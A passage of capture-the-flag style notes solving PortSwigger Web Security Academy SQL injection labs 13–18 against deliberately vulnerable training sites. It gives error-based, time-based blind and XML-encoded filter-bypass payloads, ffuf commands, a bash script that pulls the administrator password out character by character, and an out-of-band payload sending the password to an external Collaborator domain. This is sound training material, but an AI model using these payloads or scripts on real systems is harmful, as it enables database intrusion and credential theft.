![[images/walkthrough/PortSwigger/SQLi/lab13/8.png]]

- Get the password:

```SQL
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -
```

![[images/walkthrough/PortSwigger/SQLi/lab13/9.png]]

- With `curl`:

```bash
curl --path-as-is -i -s -k -b "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -; session=pWFCJrzN6ELeO3I51AR8bYlodPWoEtgO" 'https://0acc0027031b3cf9804c53bf00450015.web-security-academy.net/' | html2text | grep ERROR
```

```bash
ERROR: invalid input syntax for type integer: "ly7u1ogooznn8ptc60wh"
```


- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/SQLi/lab13/solved.png]]

Solved!
## 14. Lab: Blind SQL injection with time delays

>[!done]

>[!note]+ Lab description
> 
> 
> - [`Lab: Blind SQL injection with time delays`](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
> - Level: #Practitioner 
> 
> 
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
> 
> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

### Solution

Tracking cookie. But now, the application responds in the same way no matter if the underlying SQL query (we suppose being executed) is valid or not. 
In this case, one of the options left is to test for time-based SQL injection:

```SQL
'||(SELECT SLEEP(10))||'
```

![[images/walkthrough/PortSwigger/SQLi/lab14/1.png]]


- No delays. Trying sleep function of a different DBMS:

```SQL
'||(SELECT pg_sleep(10))||'
```

![[images/walkthrough/PortSwigger/SQLi/lab14/2.png]]

- That was all the lab.

![[images/walkthrough/PortSwigger/SQLi/lab14/solved.png]]

Solved!
## 15. Lab: Blind SQL injection with time delays and information retrieval

>[!done]

>[!note]+ Lab description
> - [`Lab: Blind SQL injection with time delays and information retrieval`](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
> - Level: #Practitioner 
> 
> 
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
> 
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
> 
> To solve the lab, log in as the `administrator` user.


### Solution

- The vulnerability is similar to the previous lab. The following payload appended ot the `TrackingId` cookie value causes a 10-second delay of the application response:

```SQL
'||(SELECT pg_sleep(10))||'
```

![[images/walkthrough/PortSwigger/SQLi/lab15/1.png]]

- Try conditional time delays:

- `true`:

```SQL
'||(CASE WHEN (1=1) THEN pg_sleep(10) ELSE '' END)||'
```

![[images/walkthrough/PortSwigger/SQLi/lab15/2.png]]

- `false`:

```SQL
'||(CASE WHEN (1=0) THEN pg_sleep(10) ELSE '' END)||'
```

![[images/walkthrough/PortSwigger/SQLi/lab15/3.png]]


- With this, you can extract meaningful information from the database.

```SQL
'||(SELECT CASE WHEN LENGTH(password)>10 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')||' # delay    -> true
 
'||(SELECT CASE WHEN LENGTH(password)>20 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')||' # no delay -> false

'||(SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')||' # delay    -> true
```

![[images/walkthrough/PortSwigger/SQLi/lab15/4.png]]

- Retrieving password character-by-character:

```bash
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')||'
```

- Automate the process using `ffuf` (to speed up the process, you can reduce the sleep time to 5 seconds):

```bash
ffuf -k -u 'https://0a4300960489f63f803217de00a40084.web-security-academy.net/'   -b "TrackingId=OZFtS5mz9AuUTGcs'||(SELECT CASE WHEN SUBSTR(password,1,1)='FUZZ' THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')||'; session=Uc54zEb0k0sNBPefBT4gjoJiQlHaHiI0" -w chars.txt -timeout 20 
```

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0a4300960489f63f803217de00a40084.web-security-academy.net/
 :: Wordlist         : FUZZ: /home/user/chars.txt
 :: Header           : Cookie: TrackingId=OZFtS5mz9AuUTGcs'||(SELECT CASE WHEN SUBSTR(password,1,1)='FUZZ' THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')||'; session=Uc54zEb0k0sNBPefBT4gjoJiQlHaHiI0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 20
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

b                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 98ms]
s                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 104ms]
t                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 105ms]
8                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 133ms]
d                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 138ms]
l                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 143ms]
c                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 160ms]
1                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 167ms]
0                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 165ms]
4                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 173ms]
2                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 193ms]
6                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 195ms]
7                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 196ms]
a                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 196ms]
k                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 204ms]
f                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 157ms]
y                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 205ms]
m                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 209ms]
e                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 157ms]
o                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 159ms]
9                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 205ms]
x                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 204ms]
i                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 158ms]
5                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 207ms]
r                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 205ms]
z                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 204ms]
n                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 155ms]
3                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 204ms]
w                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 209ms]
g                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 154ms]
h                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 258ms]
v                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 277ms]
j                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 277ms]
p                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 283ms]
q                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 282ms]
u                       [Status: 200, Size: 11464, Words: 5276, Lines: 211, Duration: 5368ms]
:: Progress: [36/36] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

- From the output, the first character of the password is `u` (the time delay is much more than other characters, around 5 seconds).

- To filter the noise:

```bash
ffuf -k -u 'https://0a4300960489f63f803217de00a40084.web-security-academy.net/'   -b "TrackingId=OZFtS5mz9AuUTGcs'||(SELECT CASE WHEN SUBSTR(password,1,1)='FUZZ' THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')||'; session=Uc54zEb0k0sNBPefBT4gjoJiQlHaHiI0" -w chars.txt -timeout 20 -mt ">5000" -s
```
```bash
u
```

- All characters:

```bash
#!/bin/bash

URL="https://0a4300960489f63f803217de00a40084.web-security-academy.net/"
COOKIE="TrackingId=OZFtS5mz9AuUTGcs"
SESSION="session=Uc54zEb0k0sNBPefBT4gjoJiQlHaHiI0"

PASSWORD=""

for pos in $(seq 1 20); do
  echo -ne "[+] Position $pos: \t"

  CHAR=$(ffuf -k -s \
    -u "$URL" \
    -b "${COOKIE}'||(SELECT CASE WHEN SUBSTR(password,${pos},1)='FUZZ' THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')||'; ${SESSION}" \
    -w chars.txt \
    -timeout 20 \
    -mt >5000 \
    | awk '{print $1}')

  PASSWORD+=$CHAR
  echo "$CHAR"
done

echo "[+] Final password: $PASSWORD"
```


>[!tip]- Use this wordlist for fuzzing
> 
> ```bash
> a
> b
> c
> d
> e
> f
> g
> h
> i
> j
> k
> l
> m
> n
> o
> p
> q
> r
> s
> t
> u
> v
> w
> x
> y
> z
> 1
> 2
> 3
> 4
> 5
> 6
> 7
> 8
> 9
> 0
> ```


- Run:

```bash
bash script.sh
```

The script is slow, but working. 


```bash
[+] Position 1: 	u
[+] Position 2: 	c
[+] Position 3: 	q
[+] Position 4: 	x
[+] Position 5: 	j
[+] Position 6: 	j
[+] Position 7: 	3
[+] Position 8: 	h
[+] Position 9: 	u
[+] Position 10: 	o
[+] Position 11: 	c
[+] Position 12: 	m
[+] Position 13: 	1
[+] Position 14: 	3
[+] Position 15: 	l
[+] Position 16: 	f
[+] Position 17: 	5
[+] Position 18: 	g
[+] Position 19: 	z
[+] Position 20: 	x
[+] Final password: ucqxjj3huocm13lf5gzx
```


- Log in with the discovered credentials:

![[images/walkthrough/PortSwigger/SQLi/lab15/solved.png]]

Solved!

## 16. Lab: Blind SQL injection with out-of-band interaction

>[!warning] #Collaborator Burp Collaborator (Professional Edition) is required to solve this lab.

>[!attention] Needs #revision.

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Blind SQL injection with out-of-band interaction`](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
> - Level: #Practitioner 
> 
> 
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
> 
> To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
> 
>> [!note] 
>> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

### Solution

- Navigate the application, browse the shop. In HTTP history, notice the application assigns a `TrackingId` cookie. Send this request to `Repeater` and add append a single quote to the cookie value:


![[images/walkthrough/PortSwigger/SQLi/lab16/1.png]]

- This, however, has no effect on the application response.
- Probe for OOB SQL injection by injecting a DNS query with your Collaborator domain:

```js
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//z77je73kgb4s5ezz6xhh1rwdb4hv5ntc.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

![[images/walkthrough/PortSwigger/SQLi/lab16/2.png]]

- In Collaborator, click `Poll now` and detect interactions:

![[images/walkthrough/PortSwigger/SQLi/lab16/3.png]]

![[images/walkthrough/PortSwigger/SQLi/lab16/solved.png]]

Solved!

## 17. Lab: Blind SQL injection with out-of-band data exfiltration

>[!warning] #Collaborator  Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Blind SQL injection with out-of-band data exfiltration`](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
> 
> - Level: #Practitioner 
> 
> 
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> 
> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
> 
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
> 
> To solve the lab, log in as the `administrator` user.
### Solution

- Send a request to the home page to `Repeater` and modify the tracking cookie. No observable effects on the application response:

![[images/walkthrough/PortSwigger/SQLi/lab17/1.png]]

- Attempt to cause a DNS query to your collaborator domain:

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//z77je73kgb4s5ezz6xhh1rwdb4hv5ntc.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```


![[images/walkthrough/PortSwigger/SQLi/lab17/2.png]]

- Go to `Collaborator` -> `Poll now`:

![[images/walkthrough/PortSwigger/SQLi/lab17/3.png]]

- Attempt to exfiltrate data:
```SQL
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.648x7qj6yeax2b6x7febkvu7dyjp7ovd.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```


- Go to `Collaborator` -> `Poll now`. See an HTTP request:

![[images/walkthrough/PortSwigger/SQLi/lab17/4.png]]

- Copy the subdomain and use as an `administrator`'s password.

![[images/walkthrough/PortSwigger/SQLi/lab17/solved.png]]

Solved!
## 18. Lab: SQL injection with filter bypass via XML encoding

>[!done]


>[!note]+ Lab description
> 
> 
> - [`Lab: SQL injection with filter bypass via XML encoding`](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
> - Level: #Practitioner 
> 
> This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
> 
> The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

### Solution

- Test the `Check stock` functionality under one of the products:

![[images/walkthrough/PortSwigger/SQLi/lab18/1.png]]

- The request looks like this:

 ![[images/walkthrough/PortSwigger/SQLi/lab18/2.png]]

```HTTP
POST /product/stock HTTP/2
Host: 0a4a00200446a16481548ec700590058.web-security-academy.net
Cookie: session=mIlfGCcDSngvIlgDViIrVmBAmsacFvY8
<SNIP>

<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			12
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

- If we suppose the data from XML is incorporated into an SQL query, we'll get something like this:

```SQL
SELECT units FROM products WHERE productId=12 AND storeId=1;
```

- Send the request to `Repeater`. For a `UNION` injection, try:

```SQL
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			12
		</productId>
	<storeId>
		1 UNION #x0078;ELECT NULL-- -
	</storeId>
</stockCheck>
```

![[images/walkthrough/PortSwigger/SQLi/lab18/3.png]]

- The application answers with `403 Forbidden` and says `Attack detected`.
- Since this is XML, the next logical move is to encode the payload attempting to bypass the filter:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			12
		</productId>
	<storeId>
		1 &#x55;NION &#x53;ELECT NULL-- -
	</storeId>
</stockCheck>
```

- This only works once you encode several characters from the payload, including dashes:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			20
		</productId>
		<storeId>
			1 &#x55;NION &#x53;ELECT N&#x55;LL&#x2D;&#x2D;
		</storeId>
	</stockCheck>
```

![[images/walkthrough/PortSwigger/SQLi/lab18/4.png]]

- The column accepts string types:


```
1 &#x55;NION &#x53;ELECT &#x27;a&#x27;&#x2D;&#x2D;
```

![[images/walkthrough/PortSwigger/SQLi/lab18/5.png]]

- List tables:

```
1 &#x55;NION &#x53;ELECT table_name FROM information_schema.tables&#x2D;&#x2D;
```

![[images/walkthrough/PortSwigger/SQLi/lab18/6.png]]

- List columns of the `users` table:

```
1 &#x55;NION &#x53;ELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27;&#x2D;&#x2D;
```
![[images/walkthrough/PortSwigger/SQLi/lab18/7.png]]

- Usernames:

```
1 &#x55;NION &#x53;ELECT username FROM users&#x2D;&#x2D;
```

![[images/walkthrough/PortSwigger/SQLi/lab18/8.png]]

- Usernames + passwords:

```
1 &#x55;NION &#x53;ELECT username||&#x27;~&#x27;||password FROM users&#x2D;&#x2D;
```

![[images/walkthrough/PortSwigger/SQLi/lab18/9.png]]

- Log in as `administrator`.

![[images/walkthrough/PortSwigger/SQLi/lab18/solved.png]]

Solved!